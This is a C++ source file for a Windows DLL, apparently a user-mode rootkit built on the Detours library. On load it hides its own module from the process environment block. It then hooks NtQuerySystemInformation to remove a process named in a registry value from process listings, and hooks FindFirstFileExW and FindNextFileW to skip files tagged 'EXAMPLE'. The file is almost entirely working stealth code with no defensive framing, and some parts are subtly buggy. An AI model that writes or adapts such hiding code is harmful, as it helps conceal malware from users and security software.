// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <windows.h>
#include "Detours.h"
#include "el_win_structs.h"

#define REGKEY "SOFTWARE\\example\\example"
#define REGKEY_VALUE "exmaple"
#define FILE_TAG "EXAMPLE"

typedef DWORD (NTAPI *elNtQuerySystemInformation )(DWORD i,PVOID SystemInformation,ULONG SystemInformationLength, PULONG ReturnLength );
DWORD NTAPI elNtQuery( ELSYSTEM_INFORMATION_CLASS i,PVOID SystemInformation,ULONG SystemInformationLength, PULONG ReturnLength );

elNtQuerySystemInformation oldNtQuery;
elNtQuerySystemInformation hookNtQuery;

typedef HANDLE (WINAPI *FFFEx)(wchar_t *lpFileName,FINDEX_INFO_LEVELS fInfoLevelId,LPVOID lpFindFileData,FINDEX_SEARCH_OPS fSearchOp,LPVOID lpSearchFilter,DWORD dwAdditionalFlags);
HANDLE WINAPI elFFFEx( wchar_t *lpFileName,FINDEX_INFO_LEVELS fInfoLevelId,LPVOID lpFindFileData,FINDEX_SEARCH_OPS fSearchOp,LPVOID lpSearchFilter,DWORD dwAdditionalFlags);

FFFEx oldFFFEx;
FFFEx hookFFFEx;

typedef BOOL (WINAPI *FNFW)( HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData );
BOOL WINAPI elFNFW( HANDLE findfile, LPWIN32_FIND_DATAW finddata );

FNFW oldFNFW;
FNFW hookFNFW;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	PELPEB peb = EL_GetPeb();
	EL_HideModule( peb, L"HideMyAss.dll" );
	HMODULE NtDll = LoadLibrary( "ntdll.dll" );
	HMODULE Kernel32 = LoadLibrary( "kernel32.dll" );

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		oldNtQuery = (elNtQuerySystemInformation) GetProcAddress( NtDll, "NtQuerySystemInformation" );
		hookNtQuery = (elNtQuerySystemInformation) DetourFunction( (PBYTE)oldNtQuery, (PBYTE)elNtQuery );

		oldFFFEx = (FFFEx) GetProcAddress( Kernel32, "FindFirstFileExW" );
		hookFFFEx = (FFFEx) DetourFunction( (PBYTE)oldFFFEx, (PBYTE) elFFFEx );

		oldFNFW = (FNFW) GetProcAddress( Kernel32, "FindNextFileW" );
		hookFNFW = (FNFW) DetourFunction( (PBYTE)oldFNFW, (PBYTE)elFNFW );

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DWORD NTAPI elNtQuery( ELSYSTEM_INFORMATION_CLASS i,PVOID SystemInformation,ULONG SystemInformationLength, PULONG ReturnLength )
{
	PELSYSTEM_PROCESS_INFORMATION cur, prev;
	char tmp[128];

	DWORD r = hookNtQuery( i, SystemInformation, SystemInformationLength, ReturnLength );

	if( i == SystemProcessInformation )
	{
		if( r == 0 )
		{
			HKEY key;
			DWORD size;
			char exe[128];
			RegOpenKey( HKEY_LOCAL_MACHINE, REGKEY, &key );

			RegQueryValueEx( key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size );

			RegCloseKey( key );

			cur = prev = (PELSYSTEM_PROCESS_INFORMATION) SystemInformation;

			while( 1 )
			{
				WideCharToMultiByte( CP_ACP, 0, cur->ProcessName.Buffer, -1, tmp, 128, NULL, NULL );

				if( strcmp( tmp, exe ) == 0 )
				{
					if( cur->NextEntryOffset == 0 )
					{
						prev->NextEntryOffset = 0;
						break;
					}
					else
					{
						prev->NextEntryOffset += cur->NextEntryOffset;
						cur = (PELSYSTEM_PROCESS_INFORMATION) ( (DWORD) cur + cur->NextEntryOffset );
					}
				}

				if( cur->NextEntryOffset == 0 )
					break;
				
				prev = cur;
				cur = (PELSYSTEM_PROCESS_INFORMATION)( (DWORD)cur + cur->NextEntryOffset );

			}
		}
	}

	return 0;
}

HANDLE WINAPI elFFFEx( wchar_t *lpFileName,FINDEX_INFO_LEVELS fInfoLevelId,LPVOID lpFindFileData,FINDEX_SEARCH_OPS fSearchOp,LPVOID lpSearchFilter,DWORD dwAdditionalFlags)
{
	HANDLE ret = hookFFFEx( lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags );

	if( ret )
	{
		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *) lpFindFileData;

		HANDLE std = GetStdHandle( STD_OUTPUT_HANDLE );

		char name[512];

		WideCharToMultiByte( CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL );

		char exe[128];

		HKEY key;
		DWORD size;

		RegOpenKey( HKEY_LOCAL_MACHINE, REGKEY, &key );

		RegQueryValueEx( key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size );

		RegCloseKey( key );
		
		if( strstr( name, FILE_TAG ) != 0 )
		{
			hookFNFW( ret, (WIN32_FIND_DATAW *)lpFindFileData );
		}
	}

	return ret;
}

BOOL WINAPI elFNFW( HANDLE findfile, LPWIN32_FIND_DATAW finddata )
{
	BOOL ret = hookFNFW( findfile, finddata );
	
	if( ret )
	{
		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *) finddata;
		
		char name[512] = "";

		WideCharToMultiByte( CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL );

		char exe[128] = "";

		HKEY key;
		DWORD size;

		RegOpenKey( HKEY_LOCAL_MACHINE, REGKEY, &key );

		RegQueryValueEx( key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size );

		RegCloseKey( key );
		
		if( strcmp( name, FILE_TAG ) == 0 )
		{
			hookFNFW( findfile, (WIN32_FIND_DATAW *)finddata );
		}
	}

	return ret;
}